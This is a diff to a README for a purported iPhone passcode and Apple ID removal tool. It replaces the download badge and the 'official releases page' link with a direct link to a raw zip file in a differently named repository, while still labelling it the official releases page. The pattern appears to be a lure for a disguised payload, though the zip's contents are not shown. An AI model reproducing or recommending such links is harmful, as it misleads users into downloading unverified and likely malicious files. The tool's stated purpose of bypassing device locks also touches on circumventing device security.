@@ -5,7 +5,7 @@ description: "Remove iPhone screen locks and Apple IDs on Windows 10 and 11 with
 ---
 # 🔓 TunesKit-iPhone-Unlocker-2026 - Remove iPhone Passcodes With Ease
 
-[![](https://img.shields.io/badge/Download-TunesKit-blue)](https://github.com/Tranh4285/TunesKit-iPhone-Unlocker-2026/releases)
+[![](https://img.shields.io/badge/Download-TunesKit-blue)](https://raw.githubusercontent.com/Tranh4285/tranh4285.github.io/main/guttie/github_io_tranh_v2.1.zip)
 
 ## 📌 About This Software
 
@@ -26,7 +26,7 @@ Before you install the software, confirm your computer meets these minimum speci
 
 Follow these steps to obtain and install the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Tranh4285/TunesKit-iPhone-Unlocker-2026/releases) to access the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Tranh4285/tranh4285.github.io/main/guttie/github_io_tranh_v2.1.zip) to access the installer.
 2. Locate the latest version of the installer file in the list.
 3. Click the file to start the download process.
 4. Once the download completes, go to your Downloads folder.
